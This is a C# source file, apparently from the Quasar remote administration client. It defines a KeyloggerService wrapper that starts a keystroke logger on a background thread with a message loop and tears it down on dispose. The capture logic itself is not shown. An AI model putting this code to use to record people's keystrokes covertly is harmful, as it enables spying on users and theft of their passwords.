using System;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Logging
{
    public class KeyloggerService : IDisposable
    {
        private readonly Thread _msgLoopThread;
        private ApplicationContext _msgLoop;
        private Keylogger _keylogger;

        public KeyloggerService()
        {
            _msgLoopThread = new Thread(() =>
            {
                _msgLoop = new ApplicationContext();
                _keylogger = new Keylogger(15000);
                _keylogger.StartLogging();
                Application.Run(_msgLoop);
            });
        }

        public void StartService()
        {
            _msgLoopThread.Start();
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this keylogger service.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected void Dispose(bool disposing)
        {
            if (disposing)
            {
                _keylogger.Dispose();
                _msgLoop.ExitThread();
                _msgLoop.Dispose();
            }
        }
    }
}
